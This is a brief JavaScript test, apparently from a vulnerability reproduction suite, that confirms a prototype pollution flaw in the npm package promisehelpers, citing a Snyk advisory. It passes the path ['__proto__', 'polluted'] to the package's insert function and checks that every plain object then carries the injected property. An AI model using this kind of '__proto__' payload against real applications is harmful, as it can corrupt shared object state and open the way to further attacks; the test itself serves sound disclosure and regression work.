//https://snyk.io/vuln/SNYK-JS-PROMISEHELPERS-598686
test("prototype pollution in promisehelpers", () => {
    
    const promisehelpers = require('promisehelpers');
    obj = {}

    expect({}.polluted).toBe(undefined);
    
    promisehelpers.insert(['__proto__', 'polluted'], "yes")(obj);
    expect({}.polluted).toBe("yes");
  });
  